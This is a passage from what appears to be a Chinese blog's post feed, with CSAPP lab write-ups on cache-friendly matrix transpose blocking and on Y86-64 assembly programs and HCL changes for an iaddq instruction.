class="hljs-number">8</span>)<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = i; k &lt; i + <span class="hljs-number">8</span>; k++)<br>            &#123;<br>                <span class="hljs-type">int</span> a_0 = A[k][j];<br>                <span class="hljs-type">int</span> a_1 = A[k][j+<span class="hljs-number">1</span>];<br>                <span class="hljs-type">int</span> a_2 = A[k][j+<span class="hljs-number">2</span>];<br>                <span class="hljs-type">int</span> a_3 = A[k][j+<span class="hljs-number">3</span>];<br>                <span class="hljs-type">int</span> a_4 = A[k][j+<span class="hljs-number">4</span>];<br>                <span class="hljs-type">int</span> a_5 = A[k][j+<span class="hljs-number">5</span>];<br>                <span class="hljs-type">int</span> a_6 = A[k][j+<span class="hljs-number">6</span>];<br>                <span class="hljs-type">int</span> a_7 = A[k][j+<span class="hljs-number">7</span>];<br>                B[j][k] = a_0;<br>                B[j+<span class="hljs-number">1</span>][k] = a_1;<br>                B[j+<span class="hljs-number">2</span>][k] = a_2;<br>                B[j+<span class="hljs-number">3</span>][k] = a_3;<br>                B[j+<span class="hljs-number">4</span>][k] = a_4;<br>                B[j+<span class="hljs-number">5</span>][k] = a_5;<br>                B[j+<span class="hljs-number">6</span>][k] = a_6;<br>                B[j+<span class="hljs-number">7</span>][k] = a_7;<br>            &#125;         <br>&#125;<br></code></pre></td></tr></table></figure><p>结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202311171855951.png" alt="第三次测试"></p><h4 id="64-64"><a href="#64-64" class="headerlink" title="64*64"></a>64*64</h4><p>每4行就会占满一行缓存，先考虑先考虑 4 × 4 分块，结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202311171905736.png" alt="64*64第一次测试"></p><p>还是考虑 8 × 8 分块，由于存在着每 4 行就会占满一个缓存的问题，在分块内部处理时就需要技巧了，我们把分块内部分成 4 个 4 × 4 的小分块分别处理：</p><ul><li>第一步，将<code>A</code>的左上和右上一次性复制给<code>B</code></li><li>第二步，用本地变量把<code>B</code>的右上角存储下来</li><li>第三步，将<code>A</code>的左下复制给<code>B</code>的右上</li><li>第四步，利用第二步存储<code>B</code>的右上角的本地变量，把<code>A</code>的右上复制给<code>B</code>的左下</li><li>第五步，把<code>A</code>的右下复制给<code>B</code>的右下</li></ul><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs inform7">void transpose_64x64(int M, int N, int A<span class="hljs-comment">[N]</span><span class="hljs-comment">[M]</span>, int B<span class="hljs-comment">[M]</span><span class="hljs-comment">[N]</span>)<br>&#123;<br>    int a_0, a_1, a_2, a_3, a_4, a_5, a_6, a_7;<br>    for (int i = 0; i &lt; 64; i += 8)&#123;<br>        for (int j = 0; j &lt; 64; j += 8)&#123;<br>            for (int k = i; k &lt; i + 4; k++)&#123;<br>                // 得到A的第1,2块<br>                a_0 = A<span class="hljs-comment">[k]</span><span class="hljs-comment">[j + 0]</span>;<br>                a_1 = A<span class="hljs-comment">[k]</span><span class="hljs-comment">[j + 1]</span>;<br>                a_2 = A<span class="hljs-comment">[k]</span><span class="hljs-comment">[j + 2]</span>;<br>                a_3 = A<span class="hljs-comment">[k]</span><span class="hljs-comment">[j + 3]</span>;<br>                a_4 = A<span class="hljs-comment">[k]</span><span class="hljs-comment">[j + 4]</span>;<br>                a_5 = A<span class="hljs-comment">[k]</span><span class="hljs-comment">[j + 5]</span>;<br>                a_6 = A<span class="hljs-comment">[k]</span><span class="hljs-comment">[j + 6]</span>;<br>                a_7 = A<span class="hljs-comment">[k]</span><span class="hljs-comment">[j + 7]</span>;<br>                // 复制给B的第1,2块<br>                B<span class="hljs-comment">[j + 0]</span><span class="hljs-comment">[k]</span> = a_0;<br>                B<span class="hljs-comment">[j + 1]</span><span class="hljs-comment">[k]</span> = a_1;<br>                B<span class="hljs-comment">[j + 2]</span><span class="hljs-comment">[k]</span> = a_2;<br>                B<span class="hljs-comment">[j + 3]</span><span class="hljs-comment">[k]</span> = a_3;<br>                B<span class="hljs-comment">[j + 0]</span><span class="hljs-comment">[k + 4]</span> = a_4;<br>                B<span class="hljs-comment">[j + 1]</span><span class="hljs-comment">[k + 4]</span> = a_5;<br>                B<span class="hljs-comment">[j + 2]</span><span class="hljs-comment">[k + 4]</span> = a_6;<br>                B<span class="hljs-comment">[j + 3]</span><span class="hljs-comment">[k + 4]</span> = a_7;<br>            &#125;<br>            for (int k = j; k &lt; j + 4; k++)&#123;<br>                // 得到B的第2块<br>                a_0 = B<span class="hljs-comment">[k]</span><span class="hljs-comment">[i + 4]</span>;<br>                a_1 = B<span class="hljs-comment">[k]</span><span class="hljs-comment">[i + 5]</span>;<br>                a_2 = B<span class="hljs-comment">[k]</span><span class="hljs-comment">[i + 6]</span>;<br>                a_3 = B<span class="hljs-comment">[k]</span><span class="hljs-comment">[i + 7]</span>;<br>                // 得到A的第3块<br>                a_4 = A<span class="hljs-comment">[i + 4]</span><span class="hljs-comment">[k]</span>;<br>                a_5 = A<span class="hljs-comment">[i + 5]</span><span class="hljs-comment">[k]</span>;<br>                a_6 = A<span class="hljs-comment">[i + 6]</span><span class="hljs-comment">[k]</span>;<br>                a_7 = A<span class="hljs-comment">[i + 7]</span><span class="hljs-comment">[k]</span>;<br>                // 复制给B的第2块<br>                B<span class="hljs-comment">[k]</span><span class="hljs-comment">[i + 4]</span> = a_4;<br>                B<span class="hljs-comment">[k]</span><span class="hljs-comment">[i + 5]</span> = a_5;<br>                B<span class="hljs-comment">[k]</span><span class="hljs-comment">[i + 6]</span> = a_6;<br>                B<span class="hljs-comment">[k]</span><span class="hljs-comment">[i + 7]</span> = a_7;<br>                // B原来的第2块移动到第3块<br>                B<span class="hljs-comment">[k + 4]</span><span class="hljs-comment">[i + 0]</span> = a_0;<br>                B<span class="hljs-comment">[k + 4]</span><span class="hljs-comment">[i + 1]</span> = a_1;<br>                B<span class="hljs-comment">[k + 4]</span><span class="hljs-comment">[i + 2]</span> = a_2;<br>                B<span class="hljs-comment">[k + 4]</span><span class="hljs-comment">[i + 3]</span> = a_3;<br>            &#125;<br>            for (int k = i + 4; k &lt; i + 8; k++)<br>            &#123;<br>                // 处理第4块<br>                a_4 = A<span class="hljs-comment">[k]</span><span class="hljs-comment">[j + 4]</span>;<br>                a_5 = A<span class="hljs-comment">[k]</span><span class="hljs-comment">[j + 5]</span>;<br>                a_6 = A<span class="hljs-comment">[k]</span><span class="hljs-comment">[j + 6]</span>;<br>                a_7 = A<span class="hljs-comment">[k]</span><span class="hljs-comment">[j + 7]</span>;<br>                B<span class="hljs-comment">[j + 4]</span><span class="hljs-comment">[k]</span> = a_4;<br>                B<span class="hljs-comment">[j + 5]</span><span class="hljs-comment">[k]</span> = a_5;<br>                B<span class="hljs-comment">[j + 6]</span><span class="hljs-comment">[k]</span> = a_6;<br>                B<span class="hljs-comment">[j + 7]</span><span class="hljs-comment">[k]</span> = a_7;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202311171910654.png" alt="64*64第二次测试"></p><h4 id="61-67"><a href="#61-67" class="headerlink" title="61*67"></a>61*67</h4><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs excel">void transpose_61x67(<span class="hljs-built_in">int</span> M, <span class="hljs-built_in">int</span> <span class="hljs-built_in">N</span>, <span class="hljs-built_in">int</span> A[<span class="hljs-built_in">N</span>][M], <span class="hljs-built_in">int</span> B[M][<span class="hljs-built_in">N</span>])&#123;<br>    for (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">N</span>; i += <span class="hljs-number">16</span>)<br>        for (<span class="hljs-built_in">int</span> j = <span class="hljs-number">0</span>; j &lt; M; j += <span class="hljs-number">16</span>)<br>            for (<span class="hljs-built_in">int</span> k = i; k &lt; i + <span class="hljs-number">16</span> &amp;&amp; k &lt; <span class="hljs-built_in">N</span>; k++)<br>                for (<span class="hljs-built_in">int</span> s = j; s &lt; j + <span class="hljs-number">16</span> &amp;&amp; s &lt; M; s++)<br>                    B[s][k] = A[k][s];<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202311171914483.png" alt="61*67测试"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202311171938540.png" alt="总成绩"></p><ul><li>太库鲁西了，太菜了做不出来，参考了许多大佬的代码，逻辑思维能力太差劲了</li><li>整个lab向我们展示了计算机缓存的美。个人感觉替换策略可以重新思考怎么优化；在看书就能意识到仅仅是代码上的不同就能带来性能上的巨大差距。</li></ul>]]></content>
    
    
    <categories>
      
      <category>CSAPP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cache</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>csapp arch_lab</title>
    <link href="/2023/09/10/csapp-arch-lab/"/>
    <url>/2023/09/10/csapp-arch-lab/</url>
    
    <content type="html"><![CDATA[<h1 id="csapp-lab-arch-lab"><a href="#csapp-lab-arch-lab" class="headerlink" title="csapp lab arch_lab"></a>csapp lab arch_lab</h1><h2 id="初见arch-lab"><a href="#初见arch-lab" class="headerlink" title="初见arch lab"></a>初见arch lab</h2><p>In this lab, you will learn about the design and implementation of a pipelined Y86-64 processor, optimizing both it and a benchmark program to maximize performance. You are allowed to make any semanticspreserving transformation to the benchmark program, or to make enhancements to the pipelined processor, or both. When you have completed the lab, you will have a keen appreciation for the interactions between code and hardware that affect the performance of your programs. </p><p>The lab is organized into three parts, each with its own handin. In Part A you will write some simple Y86-64 programs and become familiar with the Y86-64 tools. In Part B, you will extend the SEQ simulator with a new instruction. These two parts will prepare you for Part C, the heart of the lab, where you will optimize the Y86-64 benchmark program and the processor design.</p><h2 id="Part-A"><a href="#Part-A" class="headerlink" title="Part A"></a>Part A</h2><p>这一部分主要使用Y86-64汇编语言改写C语言程序，示例在<code>example.c</code>中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* linked list element */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ELE</span> &#123;</span><br>    <span class="hljs-type">long</span> val;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ELE</span> *<span class="hljs-title">next</span>;</span><br>&#125; *list_ptr;<br></code></pre></td></tr></table></figure><p>可以看到其给出了<code>链表</code>的数据结构定义</p><h3 id="sumlist"><a href="#sumlist" class="headerlink" title="sumlist"></a>sumlist</h3><p>第一个程序要求<strong>迭代</strong>求和链表元素之和，我们的程序应该包括设计栈空间，引用函数，并且停止。同时给出了测试所用的案例。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* sum_list - Sum the elements of a linked list */</span><br><span class="hljs-type">long</span> <span class="hljs-title function_">sum_list</span><span class="hljs-params">(list_ptr ls)</span><br>&#123;<br>    <span class="hljs-type">long</span> val = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (ls) &#123;<br>val += ls-&gt;val;<br>ls = ls-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">return</span> val;<br>&#125;<br></code></pre></td></tr></table></figure><p>一个简单但标准的Y86-64程序结构可以参考书上的252页。</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment"># sum_list - Sum the elements of a linked list</span><br><span class="hljs-comment"># Execution begins at address 0</span><br>        .pos <span class="hljs-number">0</span><br>        irmovq stack, %rsp      <span class="hljs-comment"># Set up stack pointer</span><br>        call main               <span class="hljs-comment"># Execute main program</span><br>        halt                    <span class="hljs-comment"># Terminate program</span><br><br><span class="hljs-comment"># Sample linked list</span><br>        .align <span class="hljs-number">8</span><br>ele1:<br>        .quad <span class="hljs-number">0x00a</span><br>        .quad ele2<br>ele2:<br>        .quad <span class="hljs-number">0x0b0</span><br>        .quad ele3<br>ele3:<br>        .quad <span class="hljs-number">0xc00</span><br>        .quad <span class="hljs-number">0</span><br><br>main:<br>        irmovq ele1,%rdi<br>        call sum_list<br>        ret<br><br><span class="hljs-comment"># long sum_list(list_ptr ls)</span><br><span class="hljs-comment"># start in %rdi</span><br>sum_list:<br>        irmovq $0, %rax         <span class="hljs-comment"># rax stores val</span><br>        jmp test<br><br>loop:<br>        mrmov<span class="hljs-string">q (%rdi)</span>, %rsi     <br>        addq %rsi, %rax<br>        mrmovq <span class="hljs-number">8</span>(%rdi), %rdi<br><br>test:<br>        andq %rdi, %rdi<br>        jne loop<br>        ret<br><br><span class="hljs-comment"># Stack starts here and grows to lower addresses</span><br>        .pos <span class="hljs-number">0x200</span><br>stack:<br><br></code></pre></td></tr></table></figure><p>使用yas编译，使用yis模拟运行程序</p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202309101138376.png" alt="sum.yo"></p><p>看到rax寄存器中结果为0xcba，程序运行正确。</p><h3 id="rsum-list"><a href="#rsum-list" class="headerlink" title="rsum_list"></a>rsum_list</h3><p>使用<strong>递归</strong>计算链表元素之和。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* rsum_list - Recursive version of sum_list */</span><br><span class="hljs-type">long</span> <span class="hljs-title function_">rsum_list</span><span class="hljs-params">(list_ptr ls)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (!ls)<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-type">long</span> val = ls-&gt;val;<br><span class="hljs-type">long</span> rest = rsum_list(ls-&gt;next);<br><span class="hljs-keyword">return</span> val + rest;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>代码如下：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment"># /* rsum_list - Recursive version of sum_list */</span><br><span class="hljs-comment"># Execution begins at address 0</span><br>        .pos <span class="hljs-number">0</span><br>        irmovq stack, %rsp      <span class="hljs-comment"># Set up stack pointer</span><br>        call main               <span class="hljs-comment"># Execute main program</span><br>        halt                    <span class="hljs-comment"># Terminate program</span><br><br><span class="hljs-comment"># Sample linked list</span><br>        .align <span class="hljs-number">8</span><br>ele1:<br>        .quad <span class="hljs-number">0x00a</span><br>        .quad ele2<br>ele2:<br>        .quad <span class="hljs-number">0x0b0</span><br>        .quad ele3<br>ele3:<br>        .quad <span class="hljs-number">0xc00</span><br>        .quad <span class="hljs-number">0</span><br><br>main:<br>        irmovq ele1,%rdi<br>        call rsum_list<br>        ret<br><br><span class="hljs-comment"># long sum_list(list_ptr ls)</span><br><span class="hljs-comment"># start in %rdi</span><br>rsum_list:<br>        andq %rdi, %rdi<br>        je <span class="hljs-keyword">return</span>               <span class="hljs-comment"># if(!ls)</span><br>        mrmov<span class="hljs-string">q (%rdi)</span>, %rbx     <span class="hljs-comment"># val = ls-&gt;val</span><br>        mrmovq <span class="hljs-number">8</span>(%rdi), %rdi    <span class="hljs-comment"># ls = ls-&gt;next</span><br>        pushq %rbx<br>        call rsum_list          <span class="hljs-comment"># rsum_list(ls-&gt;next)</span><br>        popq %rbx<br>        addq %rbx, %rax         <span class="hljs-comment"># val + rest</span><br>        ret<br><span class="hljs-keyword">return</span>:<br>        irmovq $0, %rax<br>        ret<br><br><br><span class="hljs-comment"># Stack starts here and grows to lower addresses</span><br>        .pos <span class="hljs-number">0x200</span><br>stack:<br><br></code></pre></td></tr></table></figure><p>测试结果如下</p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202309101512757.png" alt="rsum.yo"></p><p>rax寄存器显示0xcba，结果正确。</p><h3 id="copy"><a href="#copy" class="headerlink" title="copy"></a>copy</h3><p>要求数组各元素的按位异或值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* copy_block - Copy src to dest and return xor checksum of src */</span><br><span class="hljs-type">long</span> <span class="hljs-title function_">copy_block</span><span class="hljs-params">(<span class="hljs-type">long</span> *src, <span class="hljs-type">long</span> *dest, <span class="hljs-type">long</span> len)</span><br>&#123;<br>    <span class="hljs-type">long</span> result = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (len &gt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-type">long</span> val = *src++;<br>*dest++ = val;<br>result ^= val;<br>len--;<br>    &#125;<br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs perl">/* copy_block - Copy src to dest <span class="hljs-keyword">and</span> <span class="hljs-keyword">return</span> <span class="hljs-keyword">xor</span> checksum of src */<br><span class="hljs-comment"># Execution begins at address 0</span><br>        .pos <span class="hljs-number">0</span><br>        irmovq stack, %rsp      <span class="hljs-comment"># Set up stack pointer</span><br>        call main               <span class="hljs-comment"># Execute main program</span><br>        halt                    <span class="hljs-comment"># Terminate program</span><br><br><span class="hljs-comment"># Sample</span><br>        .align <span class="hljs-number">8</span><br><span class="hljs-comment"># Source block</span><br>src:<br>        .quad <span class="hljs-number">0x00a</span><br>        .quad <span class="hljs-number">0x0b0</span><br>        .quad <span class="hljs-number">0xc00</span><br><br><span class="hljs-comment"># Destination block</span><br>dest:<br>        .quad <span class="hljs-number">0x111</span><br>        .quad <span class="hljs-number">0x222</span><br>        .quad <span class="hljs-number">0x333</span><br><br>main:<br>        irmovq src, %rdi        <span class="hljs-comment"># src</span><br>        irmovq dest, %rsi       <span class="hljs-comment"># dest</span><br>        irmovq $3, %rdx         <span class="hljs-comment"># len</span><br>        call copy_block<br>        ret<br><br><span class="hljs-comment"># long copy_block(long *src, long *dest, long len)</span><br><span class="hljs-comment"># src in %rdi</span><br><span class="hljs-comment"># dest in %rsi</span><br><span class="hljs-comment"># len in %rdx</span><br>copy_block:<br>        irmovq $8, %r8<br>        irmovq $1, %r9<br>        irmovq $0, %rax<br>        andq %rdx, %rdx<br>        jmp test<br>loop:<br>        mrmov<span class="hljs-string">q (%rdi)</span>, %r10     <span class="hljs-comment"># val = *src1</span><br>        addq %r8, %rdi          <span class="hljs-comment"># src++</span><br>        rmmovq %r10, (%rsi)     <span class="hljs-comment"># *dest = val</span><br>        addq %r8, %rsi          <span class="hljs-comment"># dest++</span><br>        xorq %r10, %rax         <span class="hljs-comment"># result ^= val</span><br>        subq %r9, %rdx          <span class="hljs-comment"># len--.  Set CC</span><br>test:<br>        jne loop                <span class="hljs-comment"># Stop when 0</span><br>        ret<br><br><span class="hljs-comment"># Stack starts here and grows to lower addresses</span><br>        .pos <span class="hljs-number">0x200</span><br>stack:<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202309101336261.png" alt="image-20230910133633223"></p><p>结果正确</p><h2 id="Part-B"><a href="#Part-B" class="headerlink" title="Part B"></a>Part B</h2><p><code>to extend the SEQ processor to support the iaddq</code>，</p><p>让处理器支持iaddq指令，修改hcl文件。</p><p>书中P264Y86-64处理器对一条指令的处理包括以下几个步骤：</p><ul><li><strong>取址：</strong>根据 PC 的值从内存中读取指令字节<ul><li>指令指示符字节的两个四位部分，为<code>icode:ifun</code></li><li>寄存器指示符字节，为 <code>rA</code>, <code>rB</code></li><li>8字节常数字，为 <code>valC</code></li><li>计算下一条指令地址，为 <code>valP</code></li></ul></li><li><strong>译码：</strong>从寄存器读入最多两个操作数<ul><li>由 <code>rA</code>, <code>rB</code> 指明的寄存器，读为 <code>valA</code>, <code>valB</code></li><li>对于指令<code>popq</code>, <code>pushq</code>, <code>call</code>, <code>ret</code>也可能从<code>%rsp</code>中读</li></ul></li><li><strong>执行：</strong>根据<code>ifun</code>计算，或计算内存引用的有效地址，或增加或减少栈指针<ul><li>对上述三者之一进行的操作得到的值为<code>valE</code></li><li>如果是计算，则设置条件码</li><li>对于条件传送指令，检验条件码和传送条件，并据此更新目标寄存器</li><li>对于跳转指令，决定是否选择分支</li></ul></li><li><strong>访存：</strong>输入写入内存或从内存读出数据<ul><li>若是从内存中读出数据，则读出的值为<code>valM</code></li></ul></li><li><strong>写回：</strong>最多写两个结果到寄存器</li><li><strong>更新 PC：</strong>将 PC 设置成下一条指令的地址</li></ul><p> 其执行过程与<code>OPq</code>和<code>irmovq</code>类似，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c">指令为：iaddq V, rB<br>取指：<br>    icode:ifun &lt;- M_1[PC]<br>    rA:rB &lt;- M_1[PC+<span class="hljs-number">1</span>]<br>    valC &lt;- M_8[PC+<span class="hljs-number">2</span>]<br>    valP &lt;- PC+<span class="hljs-number">10</span><br><br>译码：<br>    valB &lt;- R[rB]<br><br>执行：<br>    valE &lt;-  valB + valC<br>    Set CC<br><br>访存：<br><br>写回：<br>    R[rB] &lt;- valE<br><br>更新PC：<br>    PC &lt;- valP<br></code></pre></td></tr></table></figure><p>根据上述代码修改hcl文件，</p><p>其中取值阶段i<code>nstr_valid</code> <code>need_regids</code> <code>need_valC</code>需要加上<code>iiaddq</code></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">bool instr_valid</span> = icode in <br>    &#123; INOP, IHALT, IRRMOVQ, IIRMOVQ, IRMMOVQ, IMRMOVQ,<br>           IOPQ, IJXX, ICALL, IRET, IPUSHQ, IPOPQ, IIADDQ &#125;;<br></code></pre></td></tr></table></figure><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">bool need_regids</span> =<br>    icode in &#123; IRRMOVQ, IOPQ, IPUSHQ, IPOPQ, <br>             IIRMOVQ, IRMMOVQ, IMRMOVQ, IIADDQ &#125;;<br></code></pre></td></tr></table></figure><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">bool need_valC</span> =<br>    icode in &#123; IIRMOVQ, IRMMOVQ, IMRMOVQ, IJXX, ICALL, IIADDQ &#125;;<br></code></pre></td></tr></table></figure><p>译码和写回 <code>srcB</code>（产生<code>valB</code>）的寄存器，需要在<code>rB</code>的括号中加上<code>iiaddq</code></p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ada">word srcB = [<br>    icode <span class="hljs-keyword">in</span> &#123; IOPQ, IRMMOVQ, IMRMOVQ, IIADDQ  &#125; : <span class="hljs-type">rB</span>;<br>    icode <span class="hljs-keyword">in</span> &#123; IPUSHQ, IPOPQ, ICALL, IRET &#125; : <span class="hljs-type">RRSP</span>;<br>    <span class="hljs-number">1</span> : <span class="hljs-type">RNONE</span>;  # Don<span class="hljs-symbol">&#x27;t</span> need register<br>];<br></code></pre></td></tr></table></figure><p><code>dst_E</code>表明写端口 E 的目的寄存器，计算出来的值<code>valE</code>将放在那里。最终结果要存放在<code>rB</code>中，需要在<code>rB</code>的前面加上<code>iiaddq</code></p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 